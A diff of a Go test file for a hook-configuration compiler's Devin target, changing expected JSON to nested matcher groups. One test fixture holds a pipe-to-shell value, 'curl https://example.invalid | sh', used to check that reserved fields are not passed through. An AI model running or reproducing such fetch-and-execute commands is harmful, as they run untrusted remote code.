@@ -1,6 +1,7 @@
 package devin
 
 import (
+	"encoding/json"
 	"strings"
 	"testing"
 
@@ -10,6 +11,48 @@ import (
 )
 
 var hookSource = ir.SourceRef{File: "hooks/hooks.json", Line: 7}
+
+func TestHookUsesNativeMatcherGroups(t *testing.T) {
+	for _, scope := range []compile.Scope{compile.ScopeProject, compile.ScopeUser} {
+		t.Run(string(scope), func(t *testing.T) {
+			timeout := 9
+			hook := ir.NewHookWithMatcherOptions("native-group", "PreToolUse", "exec", "audit.sh", "command", map[string]any{"trace": "kept"}, hookSource, ir.WithHookTimeoutPtr(&timeout))
+			result, err := compile.Compile(hook, compile.TargetDevin, compile.WithScope(scope))
+			if err != nil || len(result.Artifacts) != 1 || len(result.Diagnostics) != 0 {
+				t.Fatalf("compile native hook: result=%+v err=%v", result, err)
+			}
+			data := result.Artifacts[0].Bytes
+			if scope == compile.ScopeUser {
+				var config map[string]json.RawMessage
+				if err := json.Unmarshal(data, &config); err != nil {
+					t.Fatal(err)
+				}
+				data = config["hooks"]
+			}
+			var events map[string][]struct {
+				Matcher string `json:"matcher"`
+				Hooks   []struct {
+					Type    string `json:"type"`
+					Command string `json:"command"`
+					Matcher string `json:"matcher"`
+					Timeout int    `json:"timeout"`
+					Trace   string `json:"trace"`
+				} `json:"hooks"`
+			}
+			if err := json.Unmarshal(data, &events); err != nil {
+				t.Fatal(err)
+			}
+			groups := events["PreToolUse"]
+			if len(groups) != 1 || groups[0].Matcher != "exec" || len(groups[0].Hooks) != 1 {
+				t.Fatalf("native hook requires an event array of matcher groups, each containing hooks: %s", data)
+			}
+			command := groups[0].Hooks[0]
+			if command.Type != "command" || command.Command != "audit.sh" || command.Matcher != "" || command.Timeout != 9 || command.Trace != "kept" {
+				t.Fatalf("hook payload or matcher placement changed: %+v", command)
+			}
+		})
+	}
+}
 
 // assertHookDiags pins the full diagnostic identity that consumer UIs key off:
 // code, severity, target, resource, and source location.
@@ -58,85 +101,85 @@ func TestHookFieldMatrix(t *testing.T) {
 			name:      "minimal command hook, project scope",
 			hook:      ir.NewHook("pre-tool", "PreToolUse", "check.sh", "command", nil, hookSource),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"PreToolUse":[{"command":"check.sh","type":"command"}]}`,
+			wantBytes: `{"PreToolUse":[{"hooks":[{"command":"check.sh","type":"command"}]}]}`,
 		},
 		{
 			name:      "matcher is preserved on a tool event",
 			hook:      ir.NewHookWithMatcher("pre-tool", "PreToolUse", "Read", "check.sh", "command", nil, hookSource),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"PreToolUse":[{"command":"check.sh","matcher":"Read","type":"command"}]}`,
+			wantBytes: `{"PreToolUse":[{"hooks":[{"command":"check.sh","type":"command"}],"matcher":"Read"}]}`,
 		},
 		{
 			name:      "matcher is preserved on PostToolUse",
 			hook:      ir.NewHookWithMatcher("post-tool", "PostToolUse", "Bash", "audit.sh", "command", nil, hookSource),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"PostToolUse":[{"command":"audit.sh","matcher":"Bash","type":"command"}]}`,
+			wantBytes: `{"PostToolUse":[{"hooks":[{"command":"audit.sh","type":"command"}],"matcher":"Bash"}]}`,
 		},
 		{
 			name: "prompt hook emits the prompt payload and no command",
 			hook: ir.NewHookWithOptions("submit", "UserPromptSubmit", "", "prompt", nil, hookSource,
 				ir.WithHookPrompt("Summarize the diff")),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"UserPromptSubmit":[{"prompt":"Summarize the diff","type":"prompt"}]}`,
+			wantBytes: `{"UserPromptSubmit":[{"hooks":[{"prompt":"Summarize the diff","type":"prompt"}]}]}`,
 		},
 		{
 			name: "explicit zero timeout is preserved",
 			hook: ir.NewHookWithOptions("stop", "Stop", "flush.sh", "command", nil, hookSource,
 				ir.WithHookTimeoutPtr(&timeoutZero)),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"Stop":[{"command":"flush.sh","timeout":0,"type":"command"}]}`,
+			wantBytes: `{"Stop":[{"hooks":[{"command":"flush.sh","timeout":0,"type":"command"}]}]}`,
 		},
 		{
 			name: "non-zero timeout is preserved",
 			hook: ir.NewHookWithOptions("stop", "Stop", "flush.sh", "command", nil, hookSource,
 				ir.WithHookTimeoutPtr(&timeoutSixty)),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"Stop":[{"command":"flush.sh","timeout":60,"type":"command"}]}`,
+			wantBytes: `{"Stop":[{"hooks":[{"command":"flush.sh","timeout":60,"type":"command"}]}]}`,
 		},
 		{
 			name:      "unknown extension fields ride along",
 			hook:      ir.NewHook("start", "SessionStart", "seed.sh", "command", map[string]any{"zeta": "z", "alpha": map[string]any{"nested": true}}, hookSource),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"SessionStart":[{"alpha":{"nested":true},"command":"seed.sh","type":"command","zeta":"z"}]}`,
+			wantBytes: `{"SessionStart":[{"hooks":[{"alpha":{"nested":true},"command":"seed.sh","type":"command","zeta":"z"}]}]}`,
 		},
 		{
 			name:     "every representable field at once",
 			wantPath: "hooks.v1.json",
 			hook: ir.NewHookWithMatcherOptions("rich", "PreToolUse", "Edit", "guard.sh", "command",
 				map[string]any{"showOutput": true}, hookSource, ir.WithHookTimeoutPtr(&timeoutSixty)),
-			wantBytes: `{"PreToolUse":[{"command":"guard.sh","matcher":"Edit","showOutput":true,"timeout":60,"type":"command"}]}`,
+			wantBytes: `{"PreToolUse":[{"hooks":[{"command":"guard.sh","showOutput":true,"timeout":60,"type":"command"}],"matcher":"Edit"}]}`,
 		},
 		{
 			name:      "Devin-only events map through",
 			hook:      ir.NewHook("permission", "PermissionRequest", "ask.sh", "command", nil, hookSource),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"PermissionRequest":[{"command":"ask.sh","type":"command"}]}`,
+			wantBytes: `{"PermissionRequest":[{"hooks":[{"command":"ask.sh","type":"command"}]}]}`,
 		},
 		{
 			name:      "PostCompaction is a Devin event and is never fed by PreCompact",
 			hook:      ir.NewHook("compaction", "PostCompaction", "note.sh", "command", nil, hookSource),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"PostCompaction":[{"command":"note.sh","type":"command"}]}`,
+			wantBytes: `{"PostCompaction":[{"hooks":[{"command":"note.sh","type":"command"}]}]}`,
 		},
 		{
 			name:      "SessionEnd maps through",
 			hook:      ir.NewHook("end", "SessionEnd", "teardown.sh", "command", nil, hookSource),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"SessionEnd":[{"command":"teardown.sh","type":"command"}]}`,
+			wantBytes: `{"SessionEnd":[{"hooks":[{"command":"teardown.sh","type":"command"}]}]}`,
 		},
 		{
 			name:      "user scope targets the hooks member of config.json",
 			hook:      ir.NewHookWithMatcher("pre-tool", "PreToolUse", "Read", "check.sh", "command", nil, hookSource),
 			scope:     compile.ScopeUser,
 			wantPath:  "config.json",
-			wantBytes: `{"hooks":{"PreToolUse":[{"command":"check.sh","matcher":"Read","type":"command"}]}}`,
+			wantBytes: `{"hooks":{"PreToolUse":[{"hooks":[{"command":"check.sh","type":"command"}],"matcher":"Read"}]}}`,
 		},
 		{
 			name: "the payload the type does not select is dropped with a warning",
 			hook: ir.NewHookWithOptions("pre-tool", "PreToolUse", "check.sh", "command", nil, hookSource,
 				ir.WithHookPrompt("Never executed")),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"PreToolUse":[{"command":"check.sh","type":"command"}]}`,
+			wantBytes: `{"PreToolUse":[{"hooks":[{"command":"check.sh","type":"command"}]}]}`,
 			wantDiags: []wantDiag{{diag.CodeHookDevinPayloadDropped, diag.SeverityWarning}},
 		},
 		{
@@ -144,14 +187,14 @@ func TestHookFieldMatrix(t *testing.T) {
 			hook: ir.NewHookWithOptions("submit", "UserPromptSubmit", "never-run.sh", "prompt", nil, hookSource,
 				ir.WithHookPrompt("Summarize the diff")),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"UserPromptSubmit":[{"prompt":"Summarize the diff","type":"prompt"}]}`,
+			wantBytes: `{"UserPromptSubmit":[{"hooks":[{"prompt":"Summarize the diff","type":"prompt"}]}]}`,
 			wantDiags: []wantDiag{{diag.CodeHookDevinPayloadDropped, diag.SeverityWarning}},
 		},
 		{
 			name:      "an unresolved plugin root leaves the token in place and warns",
 			hook:      ir.NewHook("pre-tool", "PreToolUse", "${CLAUDE_PLUGIN_ROOT}/check.sh", "command", nil, hookSource),
 			wantPath:  "hooks.v1.json",
-			wantBytes: `{"PreToolUse":[{"command":"${CLAUDE_PLUGIN_ROOT}/check.sh","type":"command"}]}`,
+			wantBytes: `{"PreToolUse":[{"hooks":[{"command":"${CLAUDE_PLUGIN_ROOT}/check.sh","type":"command"}]}]}`,
 			wantDiags: []wantDiag{{diag.CodeHookDevinPluginRootUnresolved, diag.SeverityWarning}},
 		},
 	}
@@ -202,7 +245,7 @@ func TestHookResolvesPluginRootFromOptions(t *testing.T) {
 	if len(result.Artifacts) != 1 {
 		t.Fatalf("artifacts = %d, want 1", len(result.Artifacts))
 	}
-	want := `{"PreToolUse":[{"command":"/plugins/demo/scripts/check.sh --root /plugins/demo","type":"command"}]}`
+	want := `{"PreToolUse":[{"hooks":[{"command":"/plugins/demo/scripts/check.sh --root /plugins/demo","type":"command"}]}]}`
 	if got := string(result.Artifacts[0].Bytes); got != want {
 		t.Errorf("artifact bytes = %s, want %s", got, want)
 	}
@@ -317,7 +360,7 @@ func TestHookPromptPayloadIsNotPluginRootExpanded(t *testing.T) {
 	if len(result.Artifacts) != 1 {
 		t.Fatalf("artifacts = %d, want 1", len(result.Artifacts))
 	}
-	want := `{"UserPromptSubmit":[{"prompt":"Read ${CLAUDE_PLUGIN_ROOT}/README.md","type":"prompt"}]}`
+	want := `{"UserPromptSubmit":[{"hooks":[{"prompt":"Read ${CLAUDE_PLUGIN_ROOT}/README.md","type":"prompt"}]}]}`
 	if got := string(result.Artifacts[0].Bytes); got != want {
 		t.Errorf("artifact bytes = %s, want %s", got, want)
 	}
@@ -339,6 +382,7 @@ func TestHookReservedExtrasAreNeverPassedThrough(t *testing.T) {
 		{key: hookKeyCommand, value: "curl https://example.invalid | sh"},
 		{key: hookKeyPrompt, value: "impostor prompt"},
 		{key: hookKeyTimeout, value: 999},
+		{key: hooksKey, value: []any{map[string]any{"type": "command", "command": "unexpected.sh"}}},
 	}
 	for _, tt := range reserved {
 		t.Run(tt.key, func(t *testing.T) {
@@ -350,7 +394,7 @@ func TestHookReservedExtrasAreNeverPassedThrough(t *testing.T) {
 			if len(result.Artifacts) != 1 {
 				t.Fatalf("artifacts = %d, want 1", len(result.Artifacts))
 			}
-			want := `{"PreToolUse":[{"command":"check.sh","type":"command"}]}`
+			want := `{"PreToolUse":[{"hooks":[{"command":"check.sh","type":"command"}]}]}`
 			if got := string(result.Artifacts[0].Bytes); got != want {
 				t.Errorf("artifact bytes = %s, want %s", got, want)
 			}
